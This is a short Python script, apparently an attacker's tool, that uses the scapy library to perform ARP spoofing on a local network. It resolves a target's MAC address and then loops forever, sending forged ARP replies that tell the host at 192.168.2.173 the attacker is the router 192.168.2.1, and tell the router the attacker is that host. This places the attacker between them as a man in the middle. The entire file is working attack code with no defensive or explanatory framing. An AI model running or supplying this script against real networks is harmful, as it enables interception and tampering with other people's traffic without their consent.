import scapy.all as scapy 
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    #arp_request_broadcast.show()
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]
    #print(answered.summary())
    router = answered_list[0][1].hwsrc
    return router


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    #spoof ip is the ip that we pretend to be, (router_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

#spoof target_ip who_am_i_ip
while True:
    #tell target to i am router
    spoof("192.168.2.173", "192.168.2.1")
    #tell router to i am the target
    spoof("192.168.2.1", "192.168.2.173")
    time.sleep(2)
